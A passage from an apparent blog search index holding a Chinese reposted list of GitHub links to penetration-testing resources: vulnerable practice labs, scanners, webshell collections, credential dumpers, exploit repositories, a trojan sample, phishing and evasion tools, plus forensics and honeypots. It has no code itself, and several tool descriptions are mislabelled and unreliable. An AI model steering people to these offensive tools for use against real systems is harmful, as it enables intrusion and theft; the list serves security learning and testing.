            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试工具库</title>
      <link href="/2019/08/26/Python%E5%B7%A5%E5%85%B7%E5%BA%93/"/>
      <url>/2019/08/26/Python%E5%B7%A5%E5%85%B7%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>我们咋进行渗透测试的过程中，可能会用到很多的开源测试工具，但是一个个去寻找太过于繁琐了，索性tools论文中给我们整理好了，这里转载一下，也方便自己查看。</p><p>转载链接：<a href="https://www.t00ls.net/pytools.html" target="_blank" rel="noopener">https://www.t00ls.net/pytools.html</a></p><a id="more"></a><h1 id="0x01-漏洞及渗透练习平台"><a href="#0x01-漏洞及渗透练习平台" class="headerlink" title="0x01 漏洞及渗透练习平台"></a>0x01 漏洞及渗透练习平台</h1><p>WebGoat漏洞练习平台：</p><p><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat</a></p><p>webgoat-legacy漏洞练习平台:</p><p><a href="https://github.com/WebGoat/WebGoat-Legacy" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat-Legacy</a></p><p>zvuldirll漏洞练习平台：</p><p><a href="https://github.com/710leo/ZVulDrill" target="_blank" rel="noopener">https://github.com/710leo/ZVulDrill</a></p><p>vulapps漏洞练习平台：</p><p><a href="https://github.com/Medicean/VulApps" target="_blank" rel="noopener">https://github.com/Medicean/VulApps</a></p><p>dvwa漏洞练习平台：</p><p><a href="https://github.com/RandomStorm/DVWA" target="_blank" rel="noopener">https://github.com/RandomStorm/DVWA</a></p><p>数据库注入练习平台 ：</p><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p><p>用node编写的漏洞练习平台，like OWASP Node Goat：</p><p><a href="https://github.com/cr0hn/vulnerable-node" target="_blank" rel="noopener">https://github.com/cr0hn/vulnerable-node</a></p><p>Ruby编写的一款工具，生成含漏洞的虚拟机：</p><p><a href="https://github.com/cliffe/secgen" target="_blank" rel="noopener">https://github.com/cliffe/secgen</a></p><h1 id="0x02-花式扫描器"><a href="#0x02-花式扫描器" class="headerlink" title="0x02 花式扫描器"></a>0x02 花式扫描器</h1><p>Nmap端口扫描器：</p><p><a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">https://github.com/nmap/nmap</a></p><p>本地网络扫描器：</p><p><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a></p><p>子域名扫描器：</p><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p><p><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></p><p><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a></p><p><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">https://github.com/infosec-au/altdns</a></p><p>linux漏洞扫描：</p><p><a href="https://github.com/future-architect/vuls" target="_blank" rel="noopener">https://github.com/future-architect/vuls</a></p><p>基于端口扫描以及关联CVE:</p><p><a href="https://github.com/m0nad/HellRaiser" target="_blank" rel="noopener">https://github.com/m0nad/HellRaiser</a></p><p>漏洞路由扫描器：</p><p><a href="https://github.com/jh00nbr/Routerhunter-2.0" target="_blank" rel="noopener">https://github.com/jh00nbr/Routerhunter-2.0</a></p><p>迷你批量信息泄漏扫描脚本：</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p><p>Waf类型检测工具：</p><p><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></p><p>服务器端口弱口令扫描器：</p><p><a href="https://github.com/wilson9x1/fenghuangscanner_v3" target="_blank" rel="noopener">https://github.com/wilson9x1/fenghuangscanner_v3</a></p><p>Fox-scan扫描器：</p><p><a href="https://github.com/fengxuangit/Fox-scan/" target="_blank" rel="noopener">https://github.com/fengxuangit/Fox-scan/</a></p><h1 id="0x03-信息搜集工具"><a href="#0x03-信息搜集工具" class="headerlink" title="0x03 信息搜集工具"></a>0x03 信息搜集工具</h1><p>社工收集器：</p><p><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="noopener">https://github.com/n0tr00t/Sreg</a></p><p>Github信息搜集：</p><p><a href="https://github.com/sea-god/gitscan" target="_blank" rel="noopener">https://github.com/sea-god/gitscan</a></p><p>github Repo信息搜集工具：</p><p><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a></p><p>信息探测及扫描工具：</p><p><a href="https://github.com/darryllane/Bluto" target="_blank" rel="noopener">https://github.com/darryllane/Bluto</a></p><p>内部网络信息扫描器：</p><p><a href="https://github.com/sowish/LNScan" target="_blank" rel="noopener">https://github.com/sowish/LNScan</a></p><p>远程桌面登录扫描器：</p><p><a href="https://github.com/linuz/Sticky-Keys-Slayer" target="_blank" rel="noopener">https://github.com/linuz/Sticky-Keys-Slayer</a></p><p>网络基础设施渗透工具</p><p><a href="https://github.com/SECFORCE/sparta" target="_blank" rel="noopener">https://github.com/SECFORCE/sparta</a></p><p>SNMAP密码破解:</p><p><a href="https://github.com/SECFORCE/SNMP-Brute" target="_blank" rel="noopener">https://github.com/SECFORCE/SNMP-Brute</a></p><h1 id="0x04-WEB"><a href="#0x04-WEB" class="headerlink" title="0x04 WEB"></a>0x04 WEB</h1><p>webshell大合集：</p><p><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p><p>渗透以及web攻击脚本：</p><p><a href="https://github.com/brianwrf/hackUtils" target="_blank" rel="noopener">https://github.com/brianwrf/hackUtils</a></p><p>web渗透小工具大合集：</p><p><a href="https://github.com/rootphantomer/hack_tools_for_me" target="_blank" rel="noopener">https://github.com/rootphantomer/hack<em>tools</em>for_me</a></p><p>XSS数据接收平台：</p><p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p><p>XSS与CSRF工具：</p><p><a href="https://github.com/evilcos/xssor" target="_blank" rel="noopener">https://github.com/evilcos/xssor</a></p><p>xss多功能扫描器：</p><p><a href="https://github.com/shawarkhanethicalhacker/BruteXSS" target="_blank" rel="noopener">https://github.com/shawarkhanethicalhacker/BruteXSS</a></p><p>web漏洞扫描器:</p><p><a href="https://github.com/andresriancho/w3af" target="_blank" rel="noopener">https://github.com/andresriancho/w3af</a></p><p>WEB漏洞扫描器：</p><p><a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">https://github.com/sullo/nikto</a></p><p>渗透常用小工具包：</p><p><a href="https://github.com/leonteale/pentestpackage" target="_blank" rel="noopener">https://github.com/leonteale/pentestpackage</a></p><p>web目录扫描器:</p><p><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p><p>web向命令注入检测工具：</p><p><a href="https://github.com/stasinopoulos/commix" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix</a></p><p>自动化SQL注入检查工具：</p><p><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a></p><p>SSL扫描器：</p><p><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a></p><p>安全工具集合：</p><p><a href="https://github.com/codejanus/ToolSuite" target="_blank" rel="noopener">https://github.com/codejanus/ToolSuite</a></p><p>apache日志分析器：</p><p><a href="https://github.com/mthbernardes/ARTLAS" target="_blank" rel="noopener">https://github.com/mthbernardes/ARTLAS</a></p><p>php代码审计工具：</p><p><a href="https://github.com/pwnsdx/BadCode" target="_blank" rel="noopener">https://github.com/pwnsdx/BadCode</a></p><p>web指纹识别扫描：</p><p><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a></p><p>检查网站恶意攻击：</p><p><a href="https://github.com/ciscocsirt/malspider" target="_blank" rel="noopener">https://github.com/ciscocsirt/malspider</a></p><p>wordprees漏洞扫描器：</p><p><a href="https://github.com/wpscanteam/wpscan" target="_blank" rel="noopener">https://github.com/wpscanteam/wpscan</a></p><p>固件漏洞扫描器：</p><p><a href="https://github.com/misterch0c/firminator_backend" target="_blank" rel="noopener">https://github.com/misterch0c/firminator_backend</a></p><p>数据库注入工具</p><p><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></p><p>Web代理：</p><p><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="noopener">https://github.com/zt2/sqli-hunter</a></p><p>新版中国菜刀：</p><p><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a></p><p>git泄露利用EXP：</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p><p>浏览器攻击框架：</p><p><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a></p><p>自动化绕过WAF脚本：</p><p><a href="https://github.com/khalilbijjou/WAFNinja" target="_blank" rel="noopener">https://github.com/khalilbijjou/WAFNinja</a></p><p><a href="https://github.com/owtf/wafbypasser" target="_blank" rel="noopener">https://github.com/owtf/wafbypasser</a></p><p>一款开源WAF：</p><p><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a></p><p>http命令行客户端：</p><p><a href="https://github.com/jkbrzt/httpie" target="_blank" rel="noopener">https://github.com/jkbrzt/httpie</a></p><p>浏览器调试利器：</p><p><a href="https://github.com/firebug/firebug" target="_blank" rel="noopener">https://github.com/firebug/firebug</a></p><p>DISCUZ漏洞扫描器：</p><p><a href="https://github.com/code-scan/dzscan" target="_blank" rel="noopener">https://github.com/code-scan/dzscan</a></p><p>自动化代码审计工具</p><p><a href="https://github.com/wufeifei/cobra" target="_blank" rel="noopener">https://github.com/wufeifei/cobra</a></p><p>浏览器攻击框架：</p><p><a href="https://github.com/julienbedard/browsersploit" target="_blank" rel="noopener">https://github.com/julienbedard/browsersploit</a></p><p>tomcat自动后门部署：</p><p><a href="https://github.com/mgeeky/tomcatWarDeployer" target="_blank" rel="noopener">https://github.com/mgeeky/tomcatWarDeployer</a></p><p>网络空间指纹扫描器：</p><p><a href="https://github.com/nanshihui/Scan-T" target="_blank" rel="noopener">https://github.com/nanshihui/Scan-T</a></p><p>burpsuit之J2EE扫描插件：</p><p><a href="https://github.com/ilmila/J2EEScan" target="_blank" rel="noopener">https://github.com/ilmila/J2EEScan</a></p><h1 id="0x05-windows域渗透工具"><a href="#0x05-windows域渗透工具" class="headerlink" title="0x05  windows域渗透工具"></a>0x05  windows域渗透工具</h1><p>mimikatz明文注入：</p><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p><p>Powershell渗透库合集：</p><p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><p>Powershell tools合集：</p><p><a href="https://github.com/clymb3r/PowerShell" target="_blank" rel="noopener">https://github.com/clymb3r/PowerShell</a></p><p>powershell的mimikittenz:</p><p><a href="https://github.com/putterpanda/mimikittenz" target="_blank" rel="noopener">https://github.com/putterpanda/mimikittenz</a></p><p>域渗透教程:</p><p><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">https://github.com/l3m0n/pentest_study</a></p><h1 id="0x06-Fuzz"><a href="#0x06-Fuzz" class="headerlink" title="0x06 Fuzz"></a>0x06 Fuzz</h1><p>Web向Fuzz工具</p><p><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a></p><p>HTTP暴力破解，撞库攻击脚本</p><p><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a></p><h1 id="0x07-漏洞利用及攻击框架"><a href="#0x07-漏洞利用及攻击框架" class="headerlink" title="0x07 漏洞利用及攻击框架"></a>0x07 漏洞利用及攻击框架</h1><p>msf框架：</p><p><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></p><p>pocsscan攻击框架：</p><p><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="noopener">https://github.com/erevus-cn/pocscan</a></p><p>Pocsuite攻击框架:</p><p><a href="https://github.com/knownsec/Pocsuite" target="_blank" rel="noopener">https://github.com/knownsec/Pocsuite</a></p><p>Beebeeto攻击框架：</p><p><a href="https://github.com/n0tr00t/Beebeeto-framework" target="_blank" rel="noopener">https://github.com/n0tr00t/Beebeeto-framework</a></p><h1 id="0x08-漏洞POC-amp-EXP"><a href="#0x08-漏洞POC-amp-EXP" class="headerlink" title="0x08 漏洞POC&amp;EXP"></a>0x08 漏洞POC&amp;EXP</h1><p>ExploitDB官方git版本:</p><p><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database</a></p><p>php漏洞代码分析：</p><p><a href="https://github.com/80vul/phpcodz" target="_blank" rel="noopener">https://github.com/80vul/phpcodz</a></p><p>CVE-2016-2107:</p><p><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="noopener">https://github.com/FiloSottile/CVE-2016-2107</a></p><p>CVE-2015-7547 POC：</p><p><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="noopener">https://github.com/fjserna/CVE-2015-7547</a></p><p>JAVA反序列化POC生成工具:</p><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p><p>JAVA反序列化EXP:</p><p><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener">https://github.com/foxglovesec/JavaUnserializeExploits</a></p><p>Jenkins CommonCollections EXP:</p><p><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p><p>CVE-2015-2426 EXP (windows内核提权):</p><p><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe" target="_blank" rel="noopener">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p><p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):</p><p><a href="https://github.com/hxer/vulnapp" target="_blank" rel="noopener">https://github.com/hxer/vulnapp</a></p><p>php7缓存覆写漏洞Demo及相关工具:</p><p><a href="http://https//github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p><p>XcodeGhost木马样本:</p><p><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="noopener">https://github.com/XcodeGhostSource/XcodeGhost</a></p><h1 id="0x09-中间人攻击及钓鱼"><a href="#0x09-中间人攻击及钓鱼" class="headerlink" title="0x09 中间人攻击及钓鱼"></a>0x09 中间人攻击及钓鱼</h1><p>中间人攻击框架:</p><p><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory</a></p><p><a href="https://github.com/secretsquirrel/BDFProxy" target="_blank" rel="noopener">https://github.com/secretsquirrel/BDFProxy</a></p><p><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/MITMf</a></p><p>Inject code, jam wifi, and spy on wifi users:</p><p><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="noopener">https://github.com/DanMcInerney/LANs.py</a></p><p>中间人代理工具:</p><p><a href="https://github.com/intrepidusgroup/mallory" target="_blank" rel="noopener">https://github.com/intrepidusgroup/mallory</a></p><p>wifi钓鱼:</p><p><a href="https://github.com/sophron/wifiphisher" target="_blank" rel="noopener">https://github.com/sophron/wifiphisher</a></p><h1 id="0x10-密码破解"><a href="#0x10-密码破解" class="headerlink" title="0x10 密码破解"></a>0x10 密码破解</h1><p>密码破解工具:</p><p><a href="https://github.com/shinnok/johnny" target="_blank" rel="noopener">https://github.com/shinnok/johnny</a></p><p>本地存储的各类密码提取利器:</p><p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><h1 id="0x11-二进制及代码分析工具"><a href="#0x11-二进制及代码分析工具" class="headerlink" title="0x11 二进制及代码分析工具"></a>0x11 二进制及代码分析工具</h1><p>二进制分析工具</p><p><a href="https://github.com/devttys0/binwalk" target="_blank" rel="noopener">https://github.com/devttys0/binwalk</a></p><p>系统扫描器</p><p><a href="https://github.com/quarkslab/binmap" target="_blank" rel="noopener">https://github.com/quarkslab/binmap</a></p><p>rp:</p><p><a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></p><p>Windows Exploit Development工具</p><p><a href="https://github.com/lillypad/badger" target="_blank" rel="noopener">https://github.com/lillypad/badger</a></p><h1 id="0x12-二进制静态分析工具（python）"><a href="#0x12-二进制静态分析工具（python）" class="headerlink" title="0x12 二进制静态分析工具（python）"></a>0x12 二进制静态分析工具（python）</h1><p><a href="https://github.com/bdcht/amoco" target="_blank" rel="noopener">https://github.com/bdcht/amoco</a></p><p>Python Exploit Development Assistance for GDB:</p><p><a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a></p><p>对BillGates Linux Botnet系木马活动的监控工具</p><p><a href="https://github.com/ValdikSS/billgates-botnet-tracker" target="_blank" rel="noopener">https://github.com/ValdikSS/billgates-botnet-tracker</a></p><p>木马配置参数提取工具:</p><p><a href="https://github.com/kevthehermit/RATDecoders" target="_blank" rel="noopener">https://github.com/kevthehermit/RATDecoders</a></p><p>Shellphish编写的二进制分析工具（CTF向）:</p><p><a href="https://github.com/angr/angr" target="_blank" rel="noopener">https://github.com/angr/angr</a></p><p>针对python的静态代码分析工具:</p><p><a href="https://github.com/yinwang0/pysonar2" target="_blank" rel="noopener">https://github.com/yinwang0/pysonar2</a></p><p>一个自动化的脚本（shell）分析工具，用来给出警告和建议:</p><p><a href="https://github.com/koalaman/shellcheck" target="_blank" rel="noopener">https://github.com/koalaman/shellcheck</a></p><p>基于AST变换的简易Javascript反混淆辅助工具:</p><p><a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="noopener">https://github.com/ChiChou/etacsufbo</a></p><h1 id="0x13-EXP编写框架及工具"><a href="#0x13-EXP编写框架及工具" class="headerlink" title="0x13 EXP编写框架及工具"></a>0x13 EXP编写框架及工具</h1><p>二进制EXP编写工具:</p><p><a href="https://github.com/t00sh/rop-tool" target="_blank" rel="noopener">https://github.com/t00sh/rop-tool</a></p><p>CTF Pwn 类题目脚本编写框架:</p><p><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools</a></p><p>an easy-to-use io library for pwning development:</p><p><a href="https://github.com/zTrix/zio" target="_blank" rel="noopener">https://github.com/zTrix/zio</a></p><p>跨平台注入工具:</p><p><a href="https://github.com/frida/frida" target="_blank" rel="noopener">https://github.com/frida/frida</a></p><p>哈希长度扩展攻击EXP：</p><p><a href="https://github.com/citronneur/rdpy" target="_blank" rel="noopener">https://github.com/citronneur/rdpy</a></p><h1 id="0x14-隐写"><a href="#0x14-隐写" class="headerlink" title="0x14 隐写"></a>0x14 隐写</h1><p>隐写检测工具</p><p><a href="https://github.com/abeluck/stegdetect" target="_blank" rel="noopener">https://github.com/abeluck/stegdetect</a></p><h1 id="0x15-各类安全资料"><a href="#0x15-各类安全资料" class="headerlink" title="0x15 各类安全资料"></a>0x15 各类安全资料</h1><p>data_hacking合集:</p><p><a href="https://github.com/ClickSecurity/data_hacking" target="_blank" rel="noopener">https://github.com/ClickSecurity/data_hacking</a></p><p>mobile-security-wiki:</p><p><a href="https://github.com/exploitprotocol/mobile-security-wiki" target="_blank" rel="noopener">https://github.com/exploitprotocol/mobile-security-wiki</a></p><p>书籍《reverse-engineering-for-beginners》:</p><p><a href="https://github.com/veficos/reverse-engineering-for-beginners" target="_blank" rel="noopener">https://github.com/veficos/reverse-engineering-for-beginners</a></p><p>一些信息安全标准及设备配置:</p><p><a href="https://github.com/luyg24/IT_security" target="_blank" rel="noopener">https://github.com/luyg24/IT_security</a></p><p>APT相关笔记:</p><p><a href="https://github.com/kbandla/APTnotes" target="_blank" rel="noopener">https://github.com/kbandla/APTnotes</a></p><p>Kcon资料:</p><p><a href="https://github.com/knownsec/KCon" target="_blank" rel="noopener">https://github.com/knownsec/KCon</a></p><p>《DO NOT FUCK WITH A HACKER》:</p><p><a href="https://github.com/citypw/DNFWAH" target="_blank" rel="noopener">https://github.com/citypw/DNFWAH</a></p><p>各类安全脑洞图：</p><p><a href="https://github.com/phith0n/Mind-Map" target="_blank" rel="noopener">https://github.com/phith0n/Mind-Map</a></p><p>信息安全流程图：</p><p><a href="https://github.com/SecWiki/sec-chart/" target="_blank" rel="noopener">https://github.com/SecWiki/sec-chart/ tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428</a></p><h1 id="0x16-各类CTF资源"><a href="#0x16-各类CTF资源" class="headerlink" title="0x16 各类CTF资源"></a>0x16 各类CTF资源</h1><p>近年ctf writeup大全:</p><p><a href="https://github.com/ctfs/write-ups-2016" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2016</a></p><p><a href="https://github.com/ctfs/write-ups-2015" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015</a></p><p><a href="https://github.com/ctfs/write-ups-2014" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2014</a></p><p>fbctf竞赛平台Demo:</p><p><a href="https://github.com/facebook/fbctf" target="_blank" rel="noopener">https://github.com/facebook/fbctf</a></p><p>ctf Resources:</p><p><a href="https://github.com/ctfs/resources" target="_blank" rel="noopener">https://github.com/ctfs/resources</a></p><p>ctf及黑客资源合集:</p><p><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources</a></p><p>ctf和安全工具大合集:</p><p><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a></p><p>ctf向 python工具包</p><p><a href="https://github.com/P1kachu/v0lt" target="_blank" rel="noopener">https://github.com/P1kachu/v0lt</a></p><h1 id="0x17-各类编程资源"><a href="#0x17-各类编程资源" class="headerlink" title="0x17 各类编程资源"></a>0x17 各类编程资源</h1><p>大礼包（什么都有）:</p><p><a href="https://github.com/bayandin/awesome-awesomeness" target="_blank" rel="noopener">https://github.com/bayandin/awesome-awesomeness</a></p><p>bash-handbook:</p><p><a href="https://github.com/denysdovhan/bash-handbook" target="_blank" rel="noopener">https://github.com/denysdovhan/bash-handbook</a></p><p>python资源大全:</p><p><a href="https://github.com/jobbole/awesome-python-cn" target="_blank" rel="noopener">https://github.com/jobbole/awesome-python-cn</a></p><p>git学习资料:</p><p><a href="https://github.com/xirong/my-git" target="_blank" rel="noopener">https://github.com/xirong/my-git</a></p><p>安卓开源代码解析</p><p><a href="https://github.com/android-cn/android-open-project" target="_blank" rel="noopener">https://github.com/android-cn/android-open-project</a></p><p>python框架，库，资源大合集:</p><p><a href="https://github.com/vinta/awesome-python" target="_blank" rel="noopener">https://github.com/vinta/awesome-python</a></p><p>JS 正则表达式库（用于简化构造复杂的JS正则表达式）:</p><p><a href="https://github.com/VerbalExpressions/JSVerbalExpressions" target="_blank" rel="noopener">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p><h1 id="0x18-Python"><a href="#0x18-Python" class="headerlink" title="0x18 Python"></a>0x18 Python</h1><p>python 正则表达式库（用于简化构造复杂的python正则表达式）:</p><p><a href="https://github.com/VerbalExpressions/" target="_blank" rel="noopener">https://github.com/VerbalExpressions/</a></p><p>python任务管理以及命令执行库:</p><p><a href="https://github.com/pyinvoke/invoke" target="_blank" rel="noopener">https://github.com/pyinvoke/invoke</a></p><p>python exe打包库:</p><p><a href="https://github.com/pyinstaller/pyinstaller" target="_blank" rel="noopener">https://github.com/pyinstaller/pyinstaller</a></p><p>Veil-Evasion免杀项目：</p><p><a href="https://github.com/Veil-Framework/Veil-Evasion" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil-Evasion</a></p><p>py3 爬虫框架:</p><p><a href="https://github.com/orf/cyborg" target="_blank" rel="noopener">https://github.com/orf/cyborg</a></p><p>一个提供底层接口数据包编程和网络协议支持的python库:</p><p><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket</a></p><p>python requests 库:</p><p><a href="https://github.com/kennethreitz/requests" target="_blank" rel="noopener">https://github.com/kennethreitz/requests</a></p><p>python 实用工具合集:</p><p><a href="https://github.com/mahmoud/boltons" target="_blank" rel="noopener">https://github.com/mahmoud/boltons</a></p><p>python爬虫系统:</p><p><a href="https://github.com/binux/pyspider" target="_blank" rel="noopener">https://github.com/binux/pyspider</a></p><h1 id="0x19-科学上网"><a href="#0x19-科学上网" class="headerlink" title="0x19 科学上网"></a>0x19 科学上网</h1><p>科学上网工具</p><p><a href="https://github.com/XX-net/XX-Net" target="_blank" rel="noopener">https://github.com/XX-net/XX-Net</a></p><h1 id="0x20-福利"><a href="#0x20-福利" class="headerlink" title="0x20 福利"></a>0x20 福利</h1><p>微信自动抢红包动态库</p><p><a href="https://github.com/east520/AutoGetRedEnv" target="_blank" rel="noopener">https://github.com/east520/AutoGetRedEnv</a></p><p>微信抢红包插件（安卓版）</p><p><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney" target="_blank" rel="noopener">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a></p><p>hardsed神器:</p><p><a href="https://github.com/yangyangwithgnu/hardseed" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/hardseed</a></p><h1 id="0x21-甲方安全工程师生存指南"><a href="#0x21-甲方安全工程师生存指南" class="headerlink" title="0x21 甲方安全工程师生存指南"></a>0x21 甲方安全工程师生存指南</h1><p>web索引及日志搜索工具：</p><p><a href="https://github.com/thomaspatzke/WASE" target="_blank" rel="noopener">https://github.com/thomaspatzke/WASE</a></p><p>开源日志采集器：</p><p><a href="https://github.com/wgliang/logcool" target="_blank" rel="noopener">https://github.com/wgliang/logcool</a></p><p>扫描CS结构的web debuger</p><p><a href="https://github.com/Kozea/wdb" target="_blank" rel="noopener">https://github.com/Kozea/wdb</a></p><p>恢复sqlite数据库删除注册信息：</p><p><a href="https://github.com/aramosf/recoversqlite/" target="_blank" rel="noopener">https://github.com/aramosf/recoversqlite/</a></p><p>gps欺骗检测工具:</p><p><a href="https://github.com/zxsecurity/gpsnitch" target="_blank" rel="noopener">https://github.com/zxsecurity/gpsnitch</a></p><p>应急处置响应框架:</p><p><a href="https://github.com/biggiesmallsAG/nightHawkResponse" target="_blank" rel="noopener">https://github.com/biggiesmallsAG/nightHawkResponse</a></p><p>web安全开发指南:</p><p><a href="https://github.com/FallibleInc/security-guide-for-developers" target="_blank" rel="noopener">https://github.com/FallibleInc/security-guide-for-developers</a></p><p>各个知名厂商漏洞测试报告模板：</p><p><a href="https://github.com/juliocesarfort/public-pentesting-reports" target="_blank" rel="noopener">https://github.com/juliocesarfort/public-pentesting-reports </a>linux下恶意代码检测包：</p><p><a href="https://github.com/rfxn/linux-malware-detect" target="_blank" rel="noopener">https://github.com/rfxn/linux-malware-detect</a></p><p>操作系统运行指标可视化框架：</p><p><a href="https://github.com/facebook/osquery" target="_blank" rel="noopener">https://github.com/facebook/osquery</a></p><p>恶意代码分析系统：</p><p><a href="https://github.com/cuckoosandbox/cuckoo" target="_blank" rel="noopener">https://github.com/cuckoosandbox/cuckoo</a></p><p>定期搜索及存储web应用：</p><p><a href="https://github.com/Netflix/Scumblr" target="_blank" rel="noopener">https://github.com/Netflix/Scumblr</a></p><p>事件响应框架：</p><p><a href="https://github.com/google/grr" target="_blank" rel="noopener">https://github.com/google/grr</a></p><p>综合主机监控检测平台：</p><p><a href="https://github.com/ossec/ossec-hids" target="_blank" rel="noopener">https://github.com/ossec/ossec-hids</a></p><p>分布式实时数字取证系统：</p><p><a href="https://github.com/mozilla/mig" target="_blank" rel="noopener">https://github.com/mozilla/mig</a></p><p>Microsoft &amp; Unix 文件系统及硬盘取证工具：</p><p><a href="https://github.com/sleuthkit/sleuthkit" target="_blank" rel="noopener">https://github.com/sleuthkit/sleuthkit</a></p><h1 id="0x22-蜜罐"><a href="#0x22-蜜罐" class="headerlink" title="0x22 蜜罐"></a>0x22 蜜罐</h1><p>SSH蜜罐：</p><p><a href="https://github.com/desaster/kippo" target="_blank" rel="noopener">https://github.com/desaster/kippo</a></p><p>蜜罐集合资源：</p><p><a href="https://github.com/paralax/awesome-honeypots" target="_blank" rel="noopener">https://github.com/paralax/awesome-honeypots</a></p><p>kippo进阶版蜜罐：</p><p><a href="https://github.com/micheloosterhof/cowrie" target="_blank" rel="noopener">https://github.com/micheloosterhof/cowrie</a></p><p>SMTP 蜜罐：</p><p><a href="https://github.com/awhitehatter/mailoney" target="_blank" rel="noopener">https://github.com/awhitehatter/mailoney</a></p><p>web应用程序蜜罐：</p><p><a href="https://github.com/mushorg/glastopf" target="_blank" rel="noopener">https://github.com/mushorg/glastopf</a></p><p>数据库蜜罐：</p><p><a href="https://github.com/jordan-wright/elastichoney" target="_blank" rel="noopener">https://github.com/jordan-wright/elastichoney</a></p><p>web蜜罐：</p><p><a href="https://github.com/atiger77/Dionaea" 